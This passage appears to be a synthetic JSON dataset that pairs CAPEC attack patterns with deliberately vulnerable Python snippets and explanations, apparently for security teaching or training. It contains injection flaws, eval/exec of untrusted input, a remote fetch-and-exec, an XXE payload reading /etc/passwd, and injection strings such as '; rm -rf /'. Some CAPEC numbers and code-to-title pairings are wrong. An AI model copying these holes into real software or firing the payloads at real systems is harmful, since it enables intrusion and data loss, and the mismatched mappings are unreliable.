        "code_snippet": "import threading\nimport socket\n\n# Non-final static storable element\nshared_data = {'auth_token': None}\n\n# Function to simulate privileged operation\ndef privileged_operation(auth_token):\n    if auth_token == shared_data['auth_token']:\n        print('Privileged operation executed')\n    else:\n        print('Access denied')\n\n# Function to simulate network communication\ndef network_listener():\n    global shared_data\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('localhost', 9999))\n    server_socket.listen(1)\n    conn, addr = server_socket.accept()\n    data = conn.recv(1024)\n    shared_data['auth_token'] = data.decode('utf-8')\n    conn.close()\n\n# Start network listener in a separate thread\nlistener_thread = threading.Thread(target=network_listener)\nlistener_thread.start()\n\n# Simulate a privileged operation call\nprivileged_operation('replay_token')\n\n# Wait for the listener thread to finish\nlistener_thread.join()",
        "description": "This Python code snippet demonstrates a vulnerable implementation that embodies the deprecated CAPEC pattern of implementing a callback to a system routine, now referred to as hijacking a privileged thread of execution. The code includes a network listener that updates a shared authentication token (`shared_data['auth_token']`) based on incoming network data. This shared data is then used in a privileged operation without proper synchronization or validation, making it susceptible to race conditions (CWE-362) and improper synchronization (CWE-662). Additionally, the use of a non-final static storable element (`shared_data`) in a multi-threaded context (CWE-1058) and the potential for authentication bypass via replay attacks (CWE-294) are demonstrated. The code highlights the risks of insecure handling of shared data and insufficient access control in a multi-threaded environment."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "import os\nimport signal\n\n# CWE-828: Signal handler with functionality that is not asynchronous-safe\n# This signal handler is not safe as it performs non-reentrant operations\n\ndef unsafe_signal_handler(signum, frame):\n    print(\"Signal handler called with signal:\", signum)\n    # CWE-391: Unchecked Error Condition\n    try:\n        with open('/tmp/privileged_file', 'r') as f:\n            data = f.read()\n            print(data)\n    except Exception as e:\n        pass  # Ignoring exceptions\n\n# Register the unsafe signal handler\nsignal.signal(signal.SIGUSR1, unsafe_signal_handler)\n\n# Simulate privileged operation\ntry:\n    # CWE-782: Exposed IOCTL with Insufficient Access Control\n    os.system('ioctl_command')  # This should be restricted\nexcept Exception as e:\n    print(\"Privileged operation failed\")\n\n# Simulate sending a signal to the current process\nos.kill(os.getpid(), signal.SIGUSR1)",
        "description": "This Python code snippet demonstrates a deprecated attack pattern where an attacker can catch exceptions or signals from a privileged block of code. The code includes a signal handler (`unsafe_signal_handler`) that is not asynchronous-safe (CWE-828) because it performs file I/O operations, which are not reentrant. Additionally, the signal handler ignores exceptions (CWE-391), which can lead to unnoticed errors. The code also simulates a privileged operation using an IOCTL command (`os.system('ioctl_command')`), which should have restricted access but does not (CWE-782). Finally, the code sends a signal to itself to trigger the unsafe signal handler, demonstrating how an attacker might exploit this vulnerability to hijack a privileged thread of execution."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "import ctypes\n\n# Unsafe JNI equivalent in Python using ctypes to call C code\nlibc = ctypes.CDLL('libc.so.6')\n\n# Function to call system command using C library\ndef unsafe_system_call(command):\n    libc.system(command.encode('utf-8'))\n\n# Example usage\nunsafe_system_call('echo Vulnerable to sandbox escape')",
        "description": "This Python code snippet demonstrates a vulnerability similar to 'Escaping a Sandbox by Calling Code in Another Language' (CAPEC-693). It uses the ctypes library to call native C code from Python, which is analogous to using JNI in Java. The function `unsafe_system_call` takes a command as input and uses the C library's `system` function to execute it. This can lead to a 'Protection Mechanism Failure' (CWE-693) as it bypasses Python's safety mechanisms, and 'Direct Use of Unsafe JNI' (CWE-111) by exposing the application to potential vulnerabilities in the native C code. This example highlights how an attacker could exploit such a mechanism to escape a sandbox environment and execute arbitrary system commands."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "import os\nfrom urllib.parse import urlparse\n\ndef is_authorized(user, url):\n    # CWE-551: Authorization before parsing and canonicalization\n    if user != 'admin':\n        return False\n    parsed_url = urlparse(url)\n    # CWE-424: Improper Protection of Alternate Path\n    if parsed_url.path.startswith('/admin'): \n        return True\n    return False\n\n# CWE-670: Always-Incorrect Control Flow Implementation\n# CWE-657: Violation of Secure Design Principles\n# CWE-1107: Insufficient Isolation of Symbolic Constant Definitions\n\n# Example usage\nuser = 'guest'\nurl = 'http://example.com/admin/../public'\n\nif is_authorized(user, url):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a vulnerability where authorization checks are performed before URL parsing and canonicalization (CWE-551). The `is_authorized` function checks if the user is 'admin' before parsing the URL, which can lead to bypassing authorization by manipulating the URL (CWE-424). The code also contains an incorrect control flow (CWE-670) and violates secure design principles (CWE-657) by not properly isolating symbolic constant definitions (CWE-1107). The example usage shows how a non-admin user might gain unauthorized access by exploiting these weaknesses."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "import hashlib\n\n# Simulated client-side authentication\nclass Client:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = hashlib.sha256(password.encode()).hexdigest()\n\n    def authenticate(self):\n        # Client-side authentication logic\n        if self.username == 'admin' and self.password == hashlib.sha256('password123'.encode()).hexdigest():\n            return True\n        return False\n\n# Simulated server-side functionality\nclass Server:\n    def __init__(self):\n        self.data = 'Sensitive Data'\n\n    def get_data(self, client):\n        # Server relies on client-side authentication\n        if client.authenticate():\n            return self.data\n        else:\n            return 'Access Denied'\n\n# Example usage\nclient = Client('admin', 'password123')\nserver = Server()\nprint(server.get_data(client))  # Outputs: Sensitive Data\n\n# Malicious client bypassing authentication\nclass MaliciousClient(Client):\n    def authenticate(self):\n        # Bypassing client-side authentication\n        return True\n\nmalicious_client = MaliciousClient('admin', 'wrongpassword')\nprint(server.get_data(malicious_client))  # Outputs: Sensitive Data",
        "description": "This Python code snippet demonstrates a vulnerability where the server relies on client-side authentication to protect sensitive data. The `Client` class performs authentication on the client side, and the `Server` class trusts this authentication to grant access to sensitive data. A malicious client can easily bypass the authentication by overriding the `authenticate` method, demonstrating the weakness described in CWE-603 (Use of Client-Side Authentication). This example highlights the risk of relying on client-side mechanisms for security, as they can be easily subverted by an attacker."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    # CWE-20: Improper Input Validation\n    if not isinstance(file_path, str) or '..' in file_path or file_path.startswith('/'):\n        raise ValueError('Invalid file path')\n\n    # CWE-99: Improper Control of Resource Identifiers\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found'\n    except Exception as e:\n        return str(e)\n\n# Example usage\nuser_input = input('Enter the file path: ')\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a function that reads the contents of a file specified by the user. The function `read_file` takes a file path as input and attempts to read the file's contents. The code includes basic input validation to prevent directory traversal attacks (CWE-20), but it is not comprehensive and can be bypassed. The main vulnerability lies in the improper control of resource identifiers (CWE-99), where the user can specify any file path, potentially leading to unauthorized access to sensitive files. The code also highlights the importance of validating input to ensure it meets the required properties for safe processing."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "import os\n\n# Vulnerable function that executes user input as code\n# CWE-242: Code Injection\n# CWE-477: Use of Obsolete Function\n\ndef execute_user_code(user_input):\n    # Using eval() which is dangerous and deprecated for executing user input\n    eval(user_input)\n\n# Example usage\nuser_input = input('Enter code to execute: ')\nexecute_user_code(user_input)",
        "description": "This Python code snippet demonstrates a code injection vulnerability (CAPEC-242) by using the eval() function to execute user-provided input. The eval() function is considered dangerous and deprecated (CWE-477) because it can execute arbitrary code, leading to potential security risks. The code takes user input and directly evaluates it, which can be exploited by an attacker to run malicious code. This example highlights the importance of avoiding the use of obsolete and insecure functions for handling user input."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # CWE-77: Command Injection\n    os.system(f'echo {user_input}')\n\nuser_input = input('Enter a command: ')\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a code injection vulnerability, specifically a command injection (CWE-77). The function `execute_command` takes user input and directly uses it in an `os.system` call without proper validation or sanitization. This allows an attacker to inject arbitrary commands, potentially leading to malicious code execution. The code highlights the risk of improper neutralization of special elements in user input, which can modify the behavior of the intended command."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('query', '')\n    # Vulnerable code: directly embedding user input into HTML attributes without proper sanitization\n    html_content = f'<a href=\"#\" style=\"color:red\" onmouseover=\"alert(\\'{query}\\')\">Hover over me</a>'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to XSS attacks targeting HTML attributes. The application has a single route '/search' that takes a 'query' parameter from the URL. The user input is directly embedded into the 'onmouseover' attribute of an anchor tag without proper sanitization. This allows an attacker to inject malicious JavaScript code, which will be executed when a user hovers over the link. This example embodies the main idea of CAPEC-139: XSS Targeting HTML Attributes, and highlights related CWEs such as CWE-83 (Improper Neutralization of Script in Attributes in a Web Page) and CWE-79 (Improper Neutralization of Input During Web Page Generation)."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    # Vulnerable code: directly embedding user input into HTML without proper sanitization\n    html_content = f'<a href=\"javascript:alert(\\'{query}\\')\">Click me</a>'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to XSS attacks targeting URI placeholders. The main idea of the CAPEC is represented by embedding user input directly into an HTML anchor tag's href attribute without proper sanitization. The code takes a query parameter from the URL, and directly inserts it into a JavaScript URI within an anchor tag. This can be exploited by an attacker to execute arbitrary JavaScript code when a victim clicks on the link. The related CWEs are reflected in the improper neutralization of script in attributes (CWE-83), improper neutralization of encoded URI schemes (CWE-84), and general cross-site scripting vulnerabilities (CWE-79)."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    # Vulnerable to doubled character XSS attack\n    return render_template_string(f'<h1>Search Results for: {query}</h1>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to a Cross-Site Scripting (XSS) attack using doubled characters. The application has a single route '/search' that takes a query parameter 'q' from the URL. The query parameter is then directly embedded into the HTML response without proper sanitization or validation. This makes the application susceptible to XSS attacks, especially if an attacker uses doubled characters to bypass any basic input validation mechanisms. For example, an attacker could use '<<script>alert(1);</script>' as the query parameter to execute a script on the victim's browser. This snippet embodies the main idea of CAPEC-85 and related CWEs by demonstrating improper neutralization of user input, leading to a potential XSS vulnerability."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    # Incomplete denylist for XSS protection\n    denylist = ['<script>', '</script>', 'javascript:']\n    for item in denylist:\n        user_input = user_input.replace(item, '')\n    # Vulnerable to XSS via IMG tag attributes\n    response = f'<img src=\"{user_input}\" />'\n    return render_template_string(response)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application accepts user input via a POST request and attempts to sanitize it using an incomplete denylist, which is a common weakness (CWE-692). The denylist approach fails to cover all possible XSS vectors, leaving the application susceptible to attacks. Additionally, the code directly inserts user input into an IMG tag's src attribute without proper neutralization (CWE-82), making it vulnerable to XSS attacks. This example embodies the main idea of the deprecated CAPEC pattern 'XSS Using Flash' by illustrating how improper input handling and incomplete security measures can lead to XSS vulnerabilities."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query', '')\n    # Improper neutralization of invalid characters\n    sanitized_query = query.replace('<', '&lt;').replace('>', '&gt;')\n    # Potentially dangerous input is not fully sanitized\n    response = f\"<h1>Search Results for: {sanitized_query}</h1>\"\n    return render_template_string(response)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to XSS attacks due to improper neutralization of invalid characters in user input. The 'search' route takes a 'query' parameter from the URL, attempts to sanitize it by replacing '<' and '>' characters, but fails to handle other invalid characters like null, carriage return, line feed, or tab. This incomplete sanitization can be exploited by an attacker to inject malicious scripts, bypassing the filter and potentially executing XSS attacks. The code highlights the importance of comprehensive input validation and proper encoding to prevent such vulnerabilities."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # Vulnerable to command injection\n    command = f'ls {user_input}'\n    os.system(command)\n\nuser_input = input('Enter directory name: ')\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a command injection vulnerability. The function `execute_command` takes user input and constructs an OS command string using that input. The command is then executed using `os.system()`. Since the user input is directly included in the command string without proper validation or neutralization of special characters, an attacker can inject arbitrary commands. For example, if the user inputs `; rm -rf /`, it would execute the `ls` command followed by the `rm -rf /` command, potentially causing significant damage. This snippet embodies the main idea of CAPEC-88 and related CWEs, highlighting the risks of improper neutralization of special elements in command construction."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "import os\n\n# Vulnerable function that executes a command based on user input\ndef execute_command(user_input):\n    # CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\n    # CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n    command = f'echo {user_input}'\n    os.system(command)\n\n# Example usage\nuser_input = input('Enter a command: ')\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a vulnerable function `execute_command` that takes user input and executes it as part of an OS command using the `os.system` function. The vulnerability lies in the improper neutralization of special elements in the user input, which can lead to command injection (CWE-77 and CWE-78). An attacker can exploit this by providing specially crafted input to execute arbitrary commands on the system. This embodies the main idea of the deprecated CAPEC 'Linux Terminal Injection' by showing how untrusted input can be used to manipulate terminal commands."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Simulated user input\nuser_input = \"<user><name>admin</name><password>' or '1'='1</password></user>\"\n\n# Vulnerable XML parsing\ntry:\n    root = ET.fromstring(user_input)\n    username = root.find('name').text\n    password = root.find('password').text\n    # Simulated authentication check\n    if username == 'admin' and password == 'admin':\n        print('Authenticated')\n    else:\n        print('Authentication failed')\nexcept ET.ParseError as e:\n    print(f'Error parsing XML: {e}')",
        "description": "This Python code snippet demonstrates a basic example of XML Injection vulnerability. The code takes user input in the form of an XML string and parses it using the xml.etree.ElementTree module. The user input is not properly sanitized or validated, allowing an attacker to inject malicious XML content. In this example, the attacker can manipulate the XML structure to bypass authentication by injecting a payload that always evaluates to true (' or '1'='1'). This represents the main idea of CAPEC-91 (XML Injection) and highlights related weaknesses such as improper input validation (CWE-20) and improper neutralization of special elements (CWE-74, CWE-643)."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "import os\nimport importlib.util\n\ndef load_local_module(module_path):\n    if not os.path.isfile(module_path):\n        raise FileNotFoundError(f\"Module {module_path} does not exist.\")\n    spec = importlib.util.spec_from_file_location(\"loaded_module\", module_path)\n    module = importlib.util.module_from_spec(spec)\n    spec.loader.exec_module(module)\n    return module\n\n# Example usage\ntry:\n    module = load_local_module('/tmp/malicious_module.py')\n    module.run()  # Assuming the loaded module has a run() function\nexcept Exception as e:\n    print(f\"Error loading module: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerable implementation of local code inclusion. The function `load_local_module` takes a file path as an argument and attempts to load and execute the module from that path. This embodies the CAPEC concept of 'Local Code Inclusion' by allowing arbitrary code files from the local machine to be loaded and executed. The code does not verify the trustworthiness of the module being loaded, which aligns with CWE-829 ('Inclusion of Functionality from Untrusted Control Sphere'). Additionally, the code relies on dynamically-managed code resources (CWE-913) and does not ensure that the loaded module is safe or free from malicious code (CWE-506). This snippet highlights the risks associated with loading and executing local files without proper validation and control."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "import os\n\ndef load_local_file(filename):\n    # CWE-98: Improper Control of Filename for Include/Require Statement\n    if not filename.endswith('.php'):\n        raise ValueError('Invalid file type')\n\n    # CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n    file_path = os.path.join('/var/www/html', filename)\n    if not os.path.isfile(file_path):\n        raise FileNotFoundError('File does not exist')\n\n    with open(file_path, 'r') as file:\n        # CWE-473: PHP External Variable Modification\n        exec(file.read())\n\n# Example usage\nload_local_file('example.php')",
        "description": "This Python code snippet demonstrates a vulnerable pattern similar to PHP Local File Inclusion (LFI). The function `load_local_file` takes a filename as input and attempts to load and execute the contents of the file. The code checks if the file has a `.php` extension (CWE-98) and if it exists in the specified directory (CWE-829). If these checks pass, it reads and executes the file's content using `exec()`, which can be dangerous as it allows execution of arbitrary code (CWE-473). This represents the main idea of CAPEC-152, where an attacker could exploit such a function to execute arbitrary local files, potentially leading to severe security issues."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n",
        "description": "This Python code snippet demonstrates a Remote Code Inclusion vulnerability. The code downloads a Python script from a remote URL without performing any integrity checks (CWE-494). It then executes the downloaded code using the 'exec' function, which includes functionality from an untrusted control sphere (CWE-829). This can allow an attacker to execute arbitrary code on the target system, potentially leading to severe security breaches."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "import requests\nfrom lxml import etree\n\n# Vulnerable SOAP request with DTD injection\nsoap_message = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservices\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:SomeRequest>\n         <web:input><![CDATA[\n            <!DOCTYPE foo [\n               <!ELEMENT foo ANY >\n               <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n            <foo>&xxe;</foo>\n         ]]></web:input>\n      </web:SomeRequest>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Send the SOAP request\nresponse = requests.post('http://example.com/webservice', data=soap_message, headers={'Content-Type': 'text/xml'})\n\n# Parse the response\nroot = etree.fromstring(response.content)\nprint(etree.tostring(root, pretty_print=True).decode())",
        "description": "This Python code snippet demonstrates a SOAP request that includes a DTD injection vulnerability. The SOAP message contains a Document Type Definition (DTD) that defines an external entity 'xxe' which references the '/etc/passwd' file. When the SOAP message is processed by a vulnerable server, it will attempt to include the contents of '/etc/passwd' in the response. This example highlights CWE-827 (Improper Control of Document Type Definition) and CWE-776 (Improper Restriction of Recursive Entity References in DTDs), showing how an attacker can exploit these weaknesses to access sensitive files on the server."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "import struct\nimport socket\n\ndef handle_soap_request(data):\n    # Extract the length of the array from the SOAP request\n    array_length = struct.unpack('I', data[:4])[0]\n    \n    # Allocate buffer based on the specified length\n    buffer = bytearray(array_length * 4)\n    \n    # Copy the data into the buffer without checking the actual length\n    for i in range(array_length):\n        buffer[i*4:(i+1)*4] = data[4 + i*4: 4 + (i+1)*4]\n    \n    # Process the buffer (dummy processing for illustration)\n    process_buffer(buffer)\n\n\ndef process_buffer(buffer):\n    # Dummy processing function\n    print(\"Processing buffer:\", buffer)\n\n# Simulate receiving a SOAP request with an understated array length\nfake_data = struct.pack('I', 2) + b'A' * 20  # Length is 2, but actual data is 20 bytes\nhandle_soap_request(fake_data)",
        "description": "This Python code snippet demonstrates a SOAP Array Overflow vulnerability. The `handle_soap_request` function processes a SOAP request by extracting the array length from the first 4 bytes of the request. It then allocates a buffer based on this length and copies the data into the buffer without verifying the actual length of the data. This can lead to a buffer overflow if the actual data length exceeds the specified length. The `fake_data` simulates a SOAP request where the length is understated, causing the buffer to overflow when the data is copied. This example embodies the main idea of CAPEC-220 and related CWEs, such as CWE-805, CWE-130, and CWE-120."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "import logging\n\n# CWE-532: Information Exposure Through Log Files\nlogging.basicConfig(filename='server.log', level=logging.DEBUG)\n\n# Simulated transaction data\ntransaction_data = {\n    'user_id': '12345',\n    'amount': 100.0,\n    'currency': 'USD'\n}\n\n# CWE-287: Authentication Bypass Issues\n# Simulating an authentication bypass\nuser_authenticated = False\nif not user_authenticated:\n    logging.debug(f\"Unauthorized access attempt: {transaction_data}\")\n\n# CWE-493: Failure to provide confidentiality for stored data\n# Storing sensitive transaction data without encryption\nwith open('transaction_data.txt', 'w') as file:\n    file.write(str(transaction_data))\n",
        "description": "This Python code snippet demonstrates several deprecated weaknesses related to the CAPEC 'Abuse of Transaction Data Structure'. The code logs sensitive transaction data to a file (CWE-532) and simulates an authentication bypass (CWE-287). Additionally, it stores transaction data in plaintext without encryption (CWE-493). These actions represent poor security practices that could lead to data exposure and unauthorized access."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "import socket\n\n# Vulnerable client-side authentication\nclass Client:\n    def __init__(self, server_ip, server_port):\n        self.server_ip = server_ip\n        self.server_port = server_port\n        self.authenticated = False\n\n    def authenticate(self, username, password):\n        # Send credentials to server (insecurely)\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((self.server_ip, self.server_port))\n            s.sendall(f'{username}:{password}'.encode())\n            response = s.recv(1024).decode()\n            if response == 'OK':\n                self.authenticated = True\n\n    def send_data(self, data):\n        if not self.authenticated:\n            raise Exception('Client not authenticated')\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((self.server_ip, self.server_port))\n            s.sendall(data.encode())\n\n# Example usage\nclient = Client('127.0.0.1', 65432)\nclient.authenticate('user', 'pass')\nclient.send_data('Sensitive data')",
        "description": "This Python code snippet demonstrates a vulnerable client-side authentication mechanism. The `Client` class attempts to authenticate by sending credentials to the server in plain text. If the server responds with 'OK', the client considers itself authenticated and can send data. This setup is vulnerable to several issues: \n1. **CAPEC-65: Sniff Application Code** - An attacker can sniff the network traffic to capture the credentials and data being sent in plain text.\n2. **CWE-294: Authentication Bypass by Capture-replay** - An attacker can capture the authentication message and replay it to gain unauthorized access.\n3. **CWE-603: Use of Client-Side Authentication** - The authentication logic is implemented on the client side, making it easy to bypass by modifying the client code.\n\nThe code represents the main idea of the CAPEC by showing how insecure client-side authentication and unencrypted communication can lead to vulnerabilities."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "import socket\n\n# Vulnerable client-side authentication\nclass Client:\n    def __init__(self, server_ip, server_port):\n        self.server_ip = server_ip\n        self.server_port = server_port\n        self.authenticated = False\n\n    def authenticate(self, username, password):\n        # Authentication is done on the client side\n        if username == 'admin' and password == 'password':\n            self.authenticated = True\n        else:\n            self.authenticated = False\n\n    def send_data(self, data):\n        if not self.authenticated:\n            print('Authentication required')\n            return\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((self.server_ip, self.server_port))\n            s.sendall(data.encode())\n            response = s.recv(1024)\n            print('Received', repr(response))\n\n# Example usage\nclient = Client('127.0.0.1', 65432)\nclient.authenticate('admin', 'password')\nclient.send_data('Sensitive data')",
        "description": "This Python code snippet demonstrates a vulnerable client-side authentication mechanism. The `Client` class performs authentication on the client side, which can be easily bypassed by modifying the client code. This is related to CWE-603 (Use of Client-Side Authentication). The `send_data` method sends data to a server only if the client is authenticated. However, since the authentication is done on the client side, an attacker can sniff the network traffic, capture the authentication details, and replay them to bypass the authentication (CWE-294: Authentication Bypass by Capture-replay). This embodies the main idea of the deprecated CAPEC pattern, where an attacker can sniff and capture application code or data during transmission."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "import socket\n\n# Vulnerable code: Sniffing and capturing application code during initial distribution\n# This example demonstrates a simple TCP server that sends application code to a client\n# without proper encryption, making it susceptible to sniffing attacks.\n\ndef start_server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('localhost', 9999))\n    server_socket.listen(1)\n    print('Server listening on port 9999...')\n\n    while True:\n        client_socket, addr = server_socket.accept()\n        print(f'Connection from {addr} has been established.')\n\n        # Sending application code to the client\n        application_code = \"print('Hello, World!')\"\n        client_socket.send(application_code.encode('utf-8'))\n\n        client_socket.close()\n\nif __name__ == '__main__':\n    start_server()",
        "description": "This Python code snippet demonstrates a simple TCP server that sends application code to a client without proper encryption. The server listens on port 9999 and sends a string of application code to any client that connects. This setup is vulnerable to sniffing attacks, where an attacker can capture the transmitted code during its initial distribution. The code embodies the main idea of CAPEC-65, which involves sniffing and capturing application code during distribution. The related CWEs provide additional context, such as the potential for authentication bypass (CWE-294) and the use of client-side authentication (CWE-603), which are not directly addressed in this snippet but highlight the broader security concerns."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "import sqlite3\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# Create a table\ncursor.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)''')\nconn.commit()\n\n# Function to fetch user data based on username\n# This function is vulnerable to SQL Injection\n# CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\ndef get_user_data(username):\n    query = f\"SELECT * FROM users WHERE username = '{username}'\"\n    cursor.execute(query)\n    return cursor.fetchall()\n\n# Example usage\ntry:\n    # CWE-20: Improper Input Validation\n    # CWE-943: Improper Neutralization of Special Elements in Data Query Logic\n    user_data = get_user_data(\"admin' OR '1'='1\")\n    print(user_data)\nexcept sqlite3.Error as e:\n    # CWE-209: Generation of Error Message Containing Sensitive Information\n    print(f\"An error occurred: {e}\")\n\n# Close the connection\nconn.close()",
        "description": "This Python code snippet demonstrates a vulnerable function `get_user_data` that fetches user data from a SQLite database based on a provided username. The function constructs an SQL query using string interpolation, making it susceptible to SQL Injection (CWE-89). An attacker can exploit this by providing a specially crafted username, such as \"admin' OR '1'='1\", to retrieve all user data. The code also lacks proper input validation (CWE-20) and does not neutralize special elements in the data query logic (CWE-943). Additionally, if an error occurs, the error message may expose sensitive information (CWE-209). This snippet embodies the main idea of the CAPEC by showing how an adversary can send modified queries to garner sensitive data beyond what is intended."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\ndef process_file(file_path):\n    if not os.path.exists(file_path):\n        raise FileNotFoundError('File does not exist')\n\n    # CWE-646: Reliance on file extension\n    if not file_path.endswith('.txt'):\n        raise ValueError('Unsupported file type')\n\n    with open(file_path, 'r') as file:\n        data = file.read()\n        # Simulate processing the file\n        print('Processing file data...')\n\n# CWE-377: Insecure Temporary File\ntemp_file = tempfile.NamedTemporaryFile(delete=False)\ntry:\n    temp_file.write(b'corrupted data')\n    temp_file.close()\n\n    # CWE-434: Unrestricted upload of dangerous file type\n    process_file(temp_file.name)\nfinally:\n    os.remove(temp_file.name)\n",
        "description": "This Python code snippet demonstrates a scenario where an application processes a file that could be corrupted by an attacker. The `process_file` function checks if the file exists and relies on the file extension to determine if it should be processed (CWE-646). A temporary file is created insecurely (CWE-377) and written with corrupted data. The `process_file` function is then called with this temporary file, simulating the processing of a potentially dangerous file type (CWE-434). This represents the main idea of the CAPEC 'Force Use of Corrupted Files', where an application is forced to use a corrupted file, potentially leading to denial of service or other vulnerabilities."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "import os\n\ndef execute_command():\n    # CWE-1108: Excessive Reliance on Global Variables\n    global command\n    command = os.getenv('USER_COMMAND')\n    if command:\n        # CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n        eval(command)\n\n# CWE-1126: Declaration of Variable with Unnecessarily Wide Scope\ncommand = None\nexecute_command()",
